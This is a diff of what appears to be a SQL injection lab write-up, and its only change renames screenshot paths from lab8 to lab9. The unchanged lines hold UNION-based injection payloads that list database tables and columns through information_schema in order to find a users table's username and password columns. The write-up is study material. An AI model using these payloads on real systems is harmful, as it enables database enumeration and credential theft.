@@ -17,14 +17,14 @@ First, confirmed the column layout: two columns, both text-capable.
 '+UNION+SELECT+'abc','def'--
 
 
-![Confirming two text-capable columns](images/lab8-step1-column-check.png)
+![Confirming two text-capable columns](images/lab9-step1-column-check.png)
 
 **Step 1 — list every table in the database:**
 
 '+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
 
 
-![Full table listing from information_schema.tables](images/lab8-step2-tables.png)
+![Full table listing from information_schema.tables](images/lab9-step2-tables.png)
 
 Scanned the results for anything resembling a credentials table — something like `users_abcdef`, with a randomized suffix the lab appends to avoid guessable names.
 
@@ -33,7 +33,7 @@ Scanned the results for anything resembling a credentials table — something li
 '+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--
 
 
-![Column listing for the identified users table](images/lab8-step3-columns.png)
+![Column listing for the identified users table](images/lab9-step3-columns.png)
 
 Found the username and password columns among the results (again, randomized names like `username_abcdef` / `password_abcdef`).
 
